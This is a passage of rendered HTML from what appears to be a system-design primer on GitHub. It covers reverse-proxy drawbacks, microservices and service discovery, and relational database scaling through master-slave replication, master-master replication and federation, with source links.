&lt;h3&gt;&lt;a id="user-content-disadvantages-reverse-proxy" class="anchor" aria-hidden="true" href="#disadvantages-reverse-proxy"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): reverse proxy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Introducing a reverse proxy results in increased complexity.&lt;/li&gt;
&lt;li&gt;A single reverse proxy is a single point of failure, configuring multiple reverse proxies (ie a &lt;a href="https://en.wikipedia.org/wiki/Failover" rel="nofollow"&gt;failover&lt;/a&gt;) further increases complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-8" class="anchor" aria-hidden="true" href="#sources-and-further-reading-8"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/resources/glossary/reverse-proxy-vs-load-balancer/" rel="nofollow"&gt;Reverse proxy vs load balancer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" rel="nofollow"&gt;NGINX architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.haproxy.org/download/1.2/doc/architecture.txt" rel="nofollow"&gt;HAProxy architecture guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Reverse_proxy" rel="nofollow"&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-application-layer" class="anchor" aria-hidden="true" href="#application-layer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Application layer&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/feeb549c5b6e94f65c613635f7166dc26e0c7de7/687474703a2f2f692e696d6775722e636f6d2f7942355359776d2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/feeb549c5b6e94f65c613635f7166dc26e0c7de7/687474703a2f2f692e696d6775722e636f6d2f7942355359776d2e706e67" data-canonical-src="http://i.imgur.com/yB5SYwm.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://lethain.com/introduction-to-architecting-systems-for-scale/#platform_layer" rel="nofollow"&gt;Source: Intro to architecting systems for scale&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Separating out the web layer from the application layer (also known as platform layer) allows you to scale and configure both layers independently.  Adding a new API results in adding application servers without necessarily adding additional web servers.  The &lt;strong&gt;single responsibility principle&lt;/strong&gt; advocates for small and autonomous services that work together.  Small teams with small services can plan more aggressively for rapid growth.&lt;/p&gt;
&lt;p&gt;Workers in the application layer also help enable &lt;a href="#asynchronism"&gt;asynchronism&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-microservices" class="anchor" aria-hidden="true" href="#microservices"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Microservices&lt;/h3&gt;
&lt;p&gt;Related to this discussion are &lt;a href="https://en.wikipedia.org/wiki/Microservices" rel="nofollow"&gt;microservices&lt;/a&gt;, which can be described as a suite of independently deployable, small, modular services.  Each service runs a unique process and communicates through a well-defined, lightweight mechanism to serve a business goal. &lt;sup&gt;&lt;a href="https://smartbear.com/learn/api-design/what-are-microservices" rel="nofollow"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;Pinterest, for example, could have the following microservices: user profile, follower, feed, search, photo upload, etc.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-service-discovery" class="anchor" aria-hidden="true" href="#service-discovery"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Service Discovery&lt;/h3&gt;
&lt;p&gt;Systems such as &lt;a href="https://www.consul.io/docs/index.html" rel="nofollow"&gt;Consul&lt;/a&gt;, &lt;a href="https://coreos.com/etcd/docs/latest" rel="nofollow"&gt;Etcd&lt;/a&gt;, and &lt;a href="http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper" rel="nofollow"&gt;Zookeeper&lt;/a&gt; can help services find each other by keeping track of registered names, addresses, and ports.  &lt;a href="https://www.consul.io/intro/getting-started/checks.html" rel="nofollow"&gt;Health checks&lt;/a&gt; help verify service integrity and are often done using an &lt;a href="#hypertext-transfer-protocol-http"&gt;HTTP&lt;/a&gt; endpoint.  Both Consul and Etcd have a built in &lt;a href="#key-value-store"&gt;key-value store&lt;/a&gt; that can be useful for storing config values and other shared data.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-application-layer" class="anchor" aria-hidden="true" href="#disadvantages-application-layer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): application layer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Adding an application layer with loosely coupled services requires a different approach from an architectural, operations, and process viewpoint (vs a monolithic system).&lt;/li&gt;
&lt;li&gt;Microservices can add complexity in terms of deployments and operations.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-9" class="anchor" aria-hidden="true" href="#sources-and-further-reading-9"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://lethain.com/introduction-to-architecting-systems-for-scale" rel="nofollow"&gt;Intro to architecting systems for scale&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview" rel="nofollow"&gt;Crack the system design interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Service-oriented_architecture" rel="nofollow"&gt;Service oriented architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper" rel="nofollow"&gt;Introduction to Zookeeper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudncode.wordpress.com/2016/07/22/msa-getting-started/" rel="nofollow"&gt;Here's what you need to know about building microservices&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-database" class="anchor" aria-hidden="true" href="#database"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Database&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/15a7553727e6da98d0de5e9ca3792f6d2b5e92d4/687474703a2f2f692e696d6775722e636f6d2f586b6d3543587a2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/15a7553727e6da98d0de5e9ca3792f6d2b5e92d4/687474703a2f2f692e696d6775722e636f6d2f586b6d3543587a2e706e67" data-canonical-src="http://i.imgur.com/Xkm5CXz.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://www.youtube.com/watch?v=w95murBkYmU" rel="nofollow"&gt;Source: Scaling up to your first 10 million users&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-relational-database-management-system-rdbms" class="anchor" aria-hidden="true" href="#relational-database-management-system-rdbms"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Relational database management system (RDBMS)&lt;/h3&gt;
&lt;p&gt;A relational database like SQL is a collection of data items organized in tables.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ACID&lt;/strong&gt; is a set of properties of relational database &lt;a href="https://en.wikipedia.org/wiki/Database_transaction" rel="nofollow"&gt;transactions&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Atomicity&lt;/strong&gt; - Each transaction is all or nothing&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - Any transaction will bring the database from one valid state to another&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - Executing transactions concurrently has the same results as if the transactions were executed serially&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Durability&lt;/strong&gt; - Once a transaction has been committed, it will remain so&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are many techniques to scale a relational database: &lt;strong&gt;master-slave replication&lt;/strong&gt;, &lt;strong&gt;master-master replication&lt;/strong&gt;, &lt;strong&gt;federation&lt;/strong&gt;, &lt;strong&gt;sharding&lt;/strong&gt;, &lt;strong&gt;denormalization&lt;/strong&gt;, and &lt;strong&gt;SQL tuning&lt;/strong&gt;.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-master-slave-replication" class="anchor" aria-hidden="true" href="#master-slave-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Master-slave replication&lt;/h4&gt;
&lt;p&gt;The master serves reads and writes, replicating writes to one or more slaves, which serve only reads.  Slaves can also replicate to additional slaves in a tree-like fashion.  If the master goes offline, the system can continue to operate in read-only mode until a slave is promoted to a master or a new master is provisioned.&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/6a097809b9690236258747d969b1d3e0d93bb8ca/687474703a2f2f692e696d6775722e636f6d2f4339696f47746e2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/6a097809b9690236258747d969b1d3e0d93bb8ca/687474703a2f2f692e696d6775722e636f6d2f4339696f47746e2e706e67" data-canonical-src="http://i.imgur.com/C9ioGtn.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-master-slave-replication" class="anchor" aria-hidden="true" href="#disadvantages-master-slave-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): master-slave replication&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Additional logic is needed to promote a slave to a master.&lt;/li&gt;
&lt;li&gt;See &lt;a href="#disadvantages-replication"&gt;Disadvantage(s): replication&lt;/a&gt; for points related to &lt;strong&gt;both&lt;/strong&gt; master-slave and master-master.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-master-master-replication" class="anchor" aria-hidden="true" href="#master-master-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Master-master replication&lt;/h4&gt;
&lt;p&gt;Both masters serve reads and writes and coordinate with each other on writes.  If either master goes down, the system can continue to operate with both reads and writes.&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/5862604b102ee97d85f86f89edda44bde85a5b7f/687474703a2f2f692e696d6775722e636f6d2f6b7241484c47672e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/5862604b102ee97d85f86f89edda44bde85a5b7f/687474703a2f2f692e696d6775722e636f6d2f6b7241484c47672e706e67" data-canonical-src="http://i.imgur.com/krAHLGg.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-master-master-replication" class="anchor" aria-hidden="true" href="#disadvantages-master-master-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): master-master replication&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;You'll need a load balancer or you'll need to make changes to your application logic to determine where to write.&lt;/li&gt;
&lt;li&gt;Most master-master systems are either loosely consistent (violating ACID) or have increased write latency due to synchronization.&lt;/li&gt;
&lt;li&gt;Conflict resolution comes more into play as more write nodes are added and as latency increases.&lt;/li&gt;
&lt;li&gt;See &lt;a href="#disadvantages-replication"&gt;Disadvantage(s): replication&lt;/a&gt; for points related to &lt;strong&gt;both&lt;/strong&gt; master-slave and master-master.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-replication" class="anchor" aria-hidden="true" href="#disadvantages-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): replication&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;There is a potential for loss of data if the master fails before any newly written data can be replicated to other nodes.&lt;/li&gt;
&lt;li&gt;Writes are replayed to the read replicas.  If there are a lot of writes, the read replicas can get bogged down with replaying writes and can't do as many reads.&lt;/li&gt;
&lt;li&gt;The more read slaves, the more you have to replicate, which leads to greater replication lag.&lt;/li&gt;
&lt;li&gt;On some systems, writing to the master can spawn multiple threads to write in parallel, whereas read replicas only support writing sequentially with a single thread.&lt;/li&gt;
&lt;li&gt;Replication adds more hardware and additional complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-replication" class="anchor" aria-hidden="true" href="#sources-and-further-reading-replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: replication&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Multi-master_replication" rel="nofollow"&gt;Multi-master replication&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-federation" class="anchor" aria-hidden="true" href="#federation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Federation&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/6eb6570a8b6b4e1d52e3d7cc07e7959ea5dac75f/687474703a2f2f692e696d6775722e636f6d2f553371563333652e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/6eb6570a8b6b4e1d52e3d7cc07e7959ea5dac75f/687474703a2f2f692e696d6775722e636f6d2f553371563333652e706e67" data-canonical-src="http://i.imgur.com/U3qV33e.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://www.youtube.com/watch?v=w95murBkYmU" rel="nofollow"&gt;Source: Scaling up to your first 10 million users&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Federation (or functional partitioning) splits up databases by function.  For example, instead of a single, monolithic database, you could have three databases: &lt;strong&gt;forums&lt;/strong&gt;, &lt;strong&gt;users&lt;/strong&gt;, and &lt;strong&gt;products&lt;/strong&gt;, resulting in less read and write traffic to each database and therefore less replication lag.  Smaller databases result in more data that can fit in memory, which in turn results in more cache hits due to improved cache locality.  With no single central master serializing writes you can write in parallel, increasing throughput.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-federation" class="anchor" aria-hidden="true" href="#disadvantages-federation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): federation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Federation is not effective if your schema requires huge functions or tables.&lt;/li&gt;
&lt;li&gt;You'll need to update your application logic to determine which database to read and write.&lt;/li&gt;
&lt;li&gt;Joining data from two databases is more complex with a &lt;a href="http://stackoverflow.com/questions/5145637/querying-data-by-joining-two-tables-in-two-database-on-different-servers" rel="nofollow"&gt;server link&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Federation adds more hardware and additional complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-federation" class="anchor" aria-hidden="true" href="#sources-and-further-reading-federation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: federation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=w95murBkYmU" rel="nofollow"&gt;Scaling up to your first 10 million users&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
